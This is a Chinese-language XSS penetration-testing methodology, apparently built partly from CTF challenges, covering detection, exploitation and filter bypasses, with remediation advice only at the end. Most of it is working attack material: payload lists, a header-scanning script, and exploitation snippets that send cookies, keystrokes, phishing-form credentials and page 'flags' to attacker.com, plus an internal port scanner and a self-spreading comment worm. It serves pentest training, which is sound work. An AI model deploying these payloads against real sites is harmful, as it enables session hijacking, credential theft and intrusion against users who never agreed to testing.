# XSS 跨站脚本攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 XSS（跨站脚本攻击）漏洞检测与利用流程，帮助发现和利用客户端脚本注入漏洞。

## 1.2 适用范围

本文档适用于所有接收并输出用户输入的 Web 应用，包括反射型、存储型和 DOM 型 XSS 场景。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

XSS（跨站脚本攻击）是指攻击者将恶意脚本注入到受信任的网站中，当其他用户访问该网站时，恶意脚本会在用户浏览器中执行。

**本质问题**：用户输入未经适当过滤或编码就被输出到 HTML 页面中。

### XSS 类型

| 类型 | 描述 | 特点 |
|-----|------|------|
| 反射型 XSS | 恶意脚本通过 URL 参数反射到页面 | 需要诱使用户点击恶意链接 |
| 存储型 XSS | 恶意脚本存储到服务器（如数据库） | 持久化，影响所有访问用户 |
| DOM 型 XSS | 恶意脚本通过修改 DOM 执行 | 不经过服务器，纯客户端 |

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-79 | XSS |
| CWE-80 | 基本的 XSS 保护不足 |
| CWE-116 | HTML 编码不足 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 搜索功能 | 搜索结果页面 | 搜索关键词反射输出 |
| 评论系统 | 用户评论展示 | 评论内容存储后输出 |
| 用户资料 | 个人主页展示 | 用户输入的资料输出 |
| 错误页面 | 404/500 页面 | 错误信息反射输出 |
| 论坛/博客 | 帖子内容展示 | UGC 内容存储输出 |
| 聊天系统 | 消息展示 | 实时消息输出 |
| HTTP 头部处理 | 自定义头部值反射 | X-UserId 等头部值在错误响应中反射 |

## 2.3 漏洞发现方法

### 2.3.1 反射型 XSS 检测

**步骤 1：输入点识别**

识别所有用户可控的输入点：
- URL 参数
- POST 数据
- HTTP 头（Referer, User-Agent, X-Forwarded-For, X-UserId）
- Cookie

**步骤 2：基础探测**

```html
<!-- 基础 Payload -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- 绕过引号过滤 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 绕过标签过滤 -->
<img src="x" onerror="alert(1)">
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

**步骤 3：上下文分析**

根据输出位置选择 Payload：

```html
<!-- HTML 上下文 -->
<script>alert(1)</script>

<!-- 属性上下文 -->
" onmouseover="alert(1)"
' autofocus onfocus='alert(1)

<!-- JavaScript 上下文 -->
'; alert(1); //
'-alert(1)-'

<!-- URL 上下文 -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- 注释上下文 -->
--><script>alert(1)</script>
```

### 2.3.4 HTTP 头部 XSS 检测

**测试自定义头部反射**：

```bash
# 测试 X-UserId 头部
curl -v http://target.com/dashboard \
  -H "X-UserId: <img src=x onerror=alert(1)>" \
  -b session_cookie

# 检查响应中是否反射头部值
# 如果响应包含 payload 且 Content-Type 为 text/html，存在 XSS

# 测试其他常见头部
curl -v http://target.com/ \
  -H "X-Custom-Header: <script>alert(1)</script>"

curl -v http://target.com/ \
  -H "X-Forwarded-For: <img src=x onerror=alert(1)>"

curl -v http://target.com/ \
  -H "Referer: javascript:alert(1)"
```

**自动化检测脚本**：

```python
#!/usr/bin/env python3
"""
HTTP 头部 XSS 检测脚本
"""

import requests

BASE_URL = 'http://target.com'
ENDPOINT = '/dashboard'

HEADERS_TO_TEST = [
    'X-UserId',
    'X-User-ID',
    'X-Forwarded-For',
    'X-Forwarded-Host',
    'X-Forwarded-Proto',
    'Referer',
    'User-Agent',
    'X-Custom-Header',
]

PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<script>alert(1)</script>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
]

def test_header_xss(session_cookie):
    """测试 HTTP 头部 XSS"""
    session = requests.Session()
    session.cookies['session'] = session_cookie

    vulnerable_headers = []

    for header in HEADERS_TO_TEST:
        for payload in PAYLOADS:
            response = session.get(
                f'{BASE_URL}{ENDPOINT}',
                headers={header: payload}
            )

            # 检查响应中是否反射 payload
            if payload in response.text:
                # 检查 Content-Type
                content_type = response.headers.get('Content-Type', '')
                if 'text/html' in content_type:
                    vulnerable_headers.append((header, payload))
                    print(f"[VULNERABLE] Header: {header}, Payload: {payload}")

    return vulnerable_headers

if __name__ == '__main__':
    test_header_xss('your_session_cookie')
```

### 2.3.2 存储型 XSS 检测

**步骤 1：识别存储点**

- 评论/留言功能
- 用户资料编辑
- 论坛发帖
- 文件上传（文件名/内容）

**步骤 2：注入并触发**

```
1. 在存储点注入 Payload
2. 等待或触发显示
3. 检查 Payload 是否执行
```

### 2.3.3 DOM 型 XSS 检测

**步骤 1：识别 DOM 操作点**

```javascript
// 危险源
document.location
document.URL
document.referrer
location.hash
location.search
sessionStorage
localStorage

// 危险汇
innerHTML
outerHTML
document.write()
eval()
setTimeout()
setInterval()
Function()
```

**步骤 2：使用工具检测**

```bash
# 使用 DOM Invader (Burp 插件)
# 使用 XSS Hunter
```

## 2.4 漏洞利用方法

### 2.4.1 HTTP 头部 XSS 利用

**结合认证绕过的完整攻击链**：

```bash
# 场景：X-UserId 头部同时存在认证绕过和 XSS 漏洞

# 步骤 1：获取有效会话
curl -X POST http://target.com/password/test -d "password=test" -c cookies.txt

# 步骤 2：测试 XSS 反射
curl -b cookies.txt http://target.com/dashboard \
  -H "X-UserId: <img src=x onerror=alert(document.domain)>"

# 步骤 3：武器化 Payload - 窃取 Flag
PAYLOAD='<img src=x onerror="fetch(\"/dashboard\",{headers:{\"X-UserId\":\"10052\"}}).then(r=>r.text()).then(html=>{const d=new DOMParser().parseFromString(html,\"text/html\");const flag=d.querySelector(\"h5\").textContent;fetch(\"http://attacker.com/exfil?data=\"+encodeURIComponent(flag));})">'

curl -b cookies.txt http://target.com/dashboard \
  -H "X-UserId: $PAYLOAD"
```

**浏览器端利用脚本**：

```javascript
// 恶意页面 hosted at attacker.com/exploit.html
fetch('http://target.com/dashboard', {
  credentials: 'include',  // 包含受害者会话 Cookie
  headers: {
    'X-UserId': '<img src=x onerror="fetch(\'/dashboard\',{headers:{\'X-UserId\':\'10052\'}}).then(r=>r.text()).then(html=>{const d=new DOMParser().parseFromString(html,\'text/html\');const flag=d.querySelector(\'h5\').textContent;fetch(\'http://attacker.com/exfil?data=\'+encodeURIComponent(flag));})">'
  }
})
.then(r => r.text())
.then(html => {
  // 将恶意响应注入 iframe 执行 XSS
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  iframe.contentDocument.open();
  iframe.contentDocument.write(html);
  iframe.contentDocument.close();
});
```

### 2.4.2 会话劫持

```javascript
// 窃取 Cookie
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// 更隐蔽的方式
<script>
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>
```

### 2.4.2 键盘记录

```javascript
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
}
</script>
```

### 2.4.3 钓鱼攻击

```javascript
<script>
// 伪造登录表单
document.body.innerHTML = `
    <form action="https://attacker.com/steal" method="POST">
        <input name="username" placeholder="Username">
        <input name="password" type="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
`;
</script>
```

### 2.4.4 端口扫描

```javascript
<script>
// 扫描内网端口
['192.168.1.1', '192.168.0.1'].forEach(ip => {
    [80, 443, 8080].forEach(port => {
        fetch(`http://${ip}:${port}`, {mode: 'no-cors'})
            .then(() => console.log(`${ip}:${port} open`))
            .catch(() => {});
    });
});
</script>
```

### 2.4.5 蠕虫传播

```javascript
<script>
// 自动发布恶意评论
fetch('/api/comment', {
    method: 'POST',
    body: JSON.stringify({
        content: '<script>alert(1)</script>'
    })
});
</script>
```

## 2.5 漏洞利用绕过方法

### 2.5.1 标签过滤绕过

```html
<!-- 使用 SVG -->
<svg onload=alert(1)>

<!-- 使用 MathML -->
<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>

<!-- 使用 Body -->
<body onload=alert(1)>

<!-- 使用 Iframe -->
<iframe src="javascript:alert(1)">
```

### 2.5.2 关键字过滤绕过

```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 双写绕过 -->
<scriptscript>alert(1)</scriptscript>

<!-- 使用注释 -->
<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>

<!-- 使用编码 -->
<script>alert(1)</script>
<script>alert(1)</script>
```

### 2.5.3 事件处理器绕过

```html
<!-- 常见事件处理器 -->
onerror
onload
onmouseover
onfocus
onclick
onmouseenter
onanimationend
ontransitionend

<!-- 示例 -->
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### 2.5.4 WAF 绕过

```html
<!-- 使用 JavaScript 协议 -->
<a href="javascript:alert(1)">click</a>

<!-- 使用 Data URI -->
<a href="data:text/html,<script>alert(1)</script>">click</a>

<!-- 使用 Unicode 编码 -->
<scr\u0069pt>alert(1)</scr\u0069pt>

<!-- 使用 HTML 实体编码 -->
&#60;script&#62;alert(1)&#60;/script&#62;
```

### 2.5.5 黑名单过滤绕过技术

**场景描述**：当应用使用黑名单过滤 XSS 关键词时，可通过未 блокированные 事件处理器和 HTML 标签绕过。

**典型黑名单**：`['script', 'onload', 'onmouseover', 'onclick', 'onbegin', 'onerror', 'svg', "'"]`

**绕过方法 1：使用未过滤的事件处理器**

```html
<!-- 黑名单通常遗漏的事件处理器 -->
<input autofocus onfocus=alert(1)>
<input onfocusin=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video onplay=alert(1)>
<audio onplay=alert(1)>
<body onpageshow=alert(1)>
<input oninput=alert(1)>
<select onchange=alert(1)>
<form onsubmit=alert(1)>
<textarea onfocus=alert(1) autofocus>

<!-- 动画相关事件 -->
<div style="animation-name:x" onanimationend=alert(1)>
<div style="transition-property:x" ontransitionend=alert(1)>
```

**绕过方法 2：使用未过滤的 HTML 标签**

```html
<!-- 黑名单只过滤 svg 时的替代标签 -->
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

**绕过方法 3：HTML 属性上下文注入**

```html
<!-- 未引用属性上下文注入 -->
<!-- 当输出位置为：<input name=solution placeholder="..." {user_input}> -->

<!-- 方法 1：提前闭合属性 -->
> <input onfocus=alert(1) autofocus>

<!-- 方法 2：完整 HTML 重写 -->
></html><body><input autofocus onfocus=alert(1)>

<!-- 方法 3：使用双引号（黑名单只过滤单引号） -->
" onfocus="alert(1)" autofocus="
```

**绕过方法 4：编码绕过**

```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- 使用注释分割 -->
<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>
<img src=x on<!--comment-->error=alert(1)>

<!-- 使用斜杠分隔 -->
<svg/onload=alert(1)>
<input/onfocus=alert(1) autofocus>
```

### 2.5.6 无认证系统 XSS 利用

**场景描述**：当目标应用无认证机制时，所有端点公开访问，XSS 利用更加直接。

**利用步骤**：

```bash
# 步骤 1：识别无认证端点
curl -v http://target.com/challenge
# 如果响应 200 且无 401/403/重定向到登录页，说明无认证

# 步骤 2：直接提交 XSS Payload
curl -X POST http://target.com/challenge \
  -d 'solution=<img src=x onerror=alert(1)>'

# 步骤 3：如果应用有后端验证机制（如 PhantomJS），利用验证触发
curl -X POST http://target.com/challenge \
  -d 'solution=<input autofocus onfocus=alert(1)>'
```

**PhantomJS 验证机制利用**：

某些应用使用 PhantomJS 等headless浏览器验证XSS，利用方法：

```html
<!-- 利用 autofocus 自动触发 -->
<input autofocus onfocus=alert(document.domain)>

<!-- 利用页面加载事件 -->
<body onload=alert(1)>
<svg onload=alert(1)>

<!-- 完整 HTML 闭合绕过 CSS 错误 -->
></html><body><input autofocus onfocus=alert("XSS")>
```

**敏感数据窃取**：

```javascript
// 当敏感数据在页面中显示时
<img src=x onerror="fetch(window.location).then(r=>r.text()).then(html=>{
  const d=new DOMParser().parseFromString(html,'text/html');
  const flag=d.querySelector('.flag').textContent;
  fetch('http://attacker.com/exfil?data='+encodeURIComponent(flag));
})">

// 或更简洁的写法
<input autofocus onfocus="fetch('/challenge').then(r=>r.text()).then(t=>fetch('http://attacker.com/?'+t.match(/flag\{.*?\}/)[0]))">
```

### 2.5.7 临时文件 Race Condition 利用

**场景描述**：当应用将用户输入写入临时文件并短暂暴露时，可利用 race condition 访问。

**利用条件**：
- 用户输入被写入 Web 可访问目录
- 文件名可预测或存在时间窗口
- 文件在处理后未被立即删除

**利用方法**：

```bash
# 步骤 1：提交包含唯一标识的 Payload
UNIQUE_ID="xss_payload_$(date +%s)"
curl -X POST http://target.com/challenge \
  -d "solution=<img src=x onerror=alert('$UNIQUE_ID')>"

# 步骤 2：快速枚举可能的文件名
# 如果文件名包含时间戳或序列号
for i in {1..100}; do
  curl -s "http://target.com/static/payload_$i.html" | grep -q "$UNIQUE_ID" && echo "Found: payload_$i.html"
done

# 步骤 3：如果文件名随机但存在时间窗口，持续请求
# 在文件被删除前访问
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| 基础探测 | `<script>alert(1)</script>` | 通用探测 |
| 图片注入 | `<img src=x onerror=alert(1)>` | 绕过标签过滤 |
| SVG 注入 | `<svg onload=alert(1)>` | 绕过标签过滤 |
| 事件注入 | `<body onload=alert(1)>` | 事件处理器 |
| JavaScript 协议 | `javascript:alert(1)` | URL 上下文 |
| Data URI | `data:text/html,<script>alert(1)</script>` | 绕过内容过滤 |

## 3.2 自动化工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| XSStrike | 高级 XSS 检测工具 | https://github.com/s0md3v/XSStrike |
| Dalfox | XSS 参数分析和扫描 | https://github.com/hahwul/dalfox |
| Burp Suite | 手动测试和扫描 | https://portswigger.net/burp |
| BeEF | XSS 利用框架 | https://github.com/beefproject/beef |

## 3.3 XSS 测试检查清单

```
□ 测试所有输入点（参数、头、Cookie）
□ 测试不同上下文（HTML、属性、JS、URL）
□ 测试编码绕过（URL、HTML、Unicode）
□ 测试标签和关键字过滤绕过
□ 测试 WAF 绕过
□ 测试存储型和反射型
□ 测试 DOM 型 XSS
□ 测试 CSP 绕过
```

## 3.4 修复建议

1. **输出编码** - 根据输出位置进行适当的 HTML/JS/CSS 编码
2. **输入验证** - 验证和清理所有用户输入
3. **CSP 策略** - 实施内容安全策略
4. **HttpOnly Cookie** - 设置 Cookie 为 HttpOnly
5. **使用安全框架** - 使用现代框架的自动编码功能

---

**参考资源**：
- [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Payloads](https://github.com/payloadbox/xss-payload-list)
